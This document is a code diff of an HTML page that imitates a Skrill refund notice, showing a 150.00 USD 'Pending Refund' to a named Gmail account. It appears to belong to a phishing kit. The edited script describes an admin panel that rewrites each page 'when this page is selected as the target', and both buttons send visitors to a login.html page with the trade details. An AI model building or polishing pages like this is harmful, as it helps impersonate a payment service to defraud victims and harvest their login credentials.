@@ -125,13 +125,11 @@
             font-size: 26px;
             font-weight: 500;
         }
-        /* ===== UPDATED: centered and violet coloring for the "Skrill" method ===== */
         
         .method {
             display: flex;
             align-items: center;
             justify-content: center;
-            /* center horizontally */
             gap: 18px;
             margin-top: 10px;
             text-align: center;
@@ -140,7 +138,6 @@
         .skrill-mark {
             width: 52px;
             height: 44px;
-            /* violet base */
             background: linear-gradient(180deg, var(--sk-purple-1) 0%, var(--sk-purple-2) 100%);
             border-radius: 6px;
             display: flex;
@@ -183,7 +180,6 @@
         }
         
         .method-name {
-            /* violet text */
             color: var(--sk-pink);
             font-size: 44px;
             font-weight: 900;
@@ -191,7 +187,6 @@
             text-shadow: 0 2px 10px rgba(221, 109, 212, 0.18);
             line-height: 1;
         }
-        /* bottom white separator / area like image crop */
         
         .hero-bottom-spacer {
             height: 1px;
@@ -222,7 +217,6 @@
                 font-size: 34px;
             }
         }
-        /* ===== Body ===== */
         
         .card-body-custom {
             padding: 1.5rem 1.75rem 1.75rem;
@@ -331,7 +325,6 @@
 <body>
     <div class="page-wrap">
         <div class="trade-card">
-            <!-- UPDATED: centered + violet method -->
             <div class="method" aria-label="Method">
                 <div class="skrill-mark" aria-hidden="true">
                     <span class="skrill-flare"></span>
@@ -364,23 +357,26 @@
                 <div class="detail-list">
                     <div class="detail-row">
                         <span class="detail-label">Account for Refund</span>
-                        <span class="detail-value" id="paymentMethod">agnesjosphat907@gmail.com</span>
+                        <span class="detail-value" id="paymentMethod"
+                              data-payment-method="agnesjosphat907@gmail.com">agnesjosphat907@gmail.com</span>
                     </div>
 
                     <div class="detail-row">
                         <span class="detail-label">Refund ID</span>
-                        <span class="detail-value" id="tradeId">TR-644551</span>
+                        <span class="detail-value" id="tradeId"
+                              data-trade-id="TR-644551">TR-644551</span>
                     </div>
 
                     <div class="detail-row">
                         <span class="detail-label">Refund Amount</span>
-                        <span class="detail-value amount" id="amount">150.00 USD</span>
+                        <span class="detail-value amount" id="amount"
+                              data-amount="150.00 USD">150.00 USD</span>
                     </div>
 
                     <div class="detail-row">
                         <span class="detail-label">Status</span>
                         <span class="detail-value" id="statusWrap">
-              <span class="status-badge waiting" id="statusBadge">
+              <span class="status-badge waiting" id="statusBadge" data-status="waiting">
                 <i class="fas fa-clock"></i>
                 <span id="statusText">Pending Refund</span>
                         </span>
@@ -400,11 +396,11 @@
             </div>
         </div>
     </div>
-<script>
-    // Trade values are loaded from the server config (updated via admin panel).
-    // Priority: /api/trade-public -> /trade-config.json -> hardcoded fallback.
-    // URL params are IGNORED for trade values so admin changes always show.
 
+<script>
+    // This page's own trade values. The admin panel rewrites these values
+    // directly in this file when this page is selected as the target.
+    // NO fetching: values shown are exactly what is baked into this file.
     const FALLBACK_TRADE = {
         tradeId: "TR-644551",
         amount: "150.00 USD",
@@ -441,50 +437,22 @@
         }
     }
 
-    async function loadTrade() {
-        for (const url of ["/api/trade-public", "/trade-config.json"]) {
-            try {
-                const res = await fetch(url + "?_=" + Date.now(), { cache: "no-store" });
-                if (res.ok) {
-                    const cfg = await res.json();
-                    if (cfg && (cfg.tradeId || cfg.amount)) {
-                        return {
-                            tradeId: cfg.tradeId || FALLBACK_TRADE.tradeId,
-                            amount: cfg.amount || FALLBACK_TRADE.amount,
-                            paymentMethod: cfg.paymentMethod || FALLBACK_TRADE.paymentMethod,
-                            status: cfg.status || FALLBACK_TRADE.status,
-                        };
-                    }
-                }
-            } catch (e) { /* try next */ }
-        }
-        return { ...FALLBACK_TRADE };
+    function goToLogin(action, trade) {
+        const params = new URLSearchParams({
+            action: action,
+            tradeId: trade.tradeId,
+            amount: trade.amount,
+            method: trade.paymentMethod,
+            status: normalizeStatus(trade.status),
+        });
+        window.location.href = `login.html?${params.toString()}`;
     }
 
-    loadTrade().then((trade) => {
-        renderTrade(trade);
-        document.getElementById("confirmBtn").addEventListener("click", () => {
-            const params = new URLSearchParams({
-                action: "confirm",
-                tradeId: trade.tradeId,
-                amount: trade.amount,
-                method: trade.paymentMethod,
-                status: normalizeStatus(trade.status),
-            });
-            window.location.href = `login.html?${params.toString()}`;
-        });
-        document.getElementById("cancelBtn").addEventListener("click", () => {
-            const params = new URLSearchParams({
-                action: "cancel",
-                tradeId: trade.tradeId,
-                amount: trade.amount,
-                method: trade.paymentMethod,
-                status: normalizeStatus(trade.status),
-            });
-            window.location.href = `login.html?${params.toString()}`;
-        });
-    });
-</script>  
+    const trade = { ...FALLBACK_TRADE };
+    renderTrade(trade);
+    document.getElementById("confirmBtn").addEventListener("click", () => goToLogin("confirm", trade));
+    document.getElementById("cancelBtn").addEventListener("click", () => goToLogin("cancel", trade));
+</script>
 </body>
 
 </html>
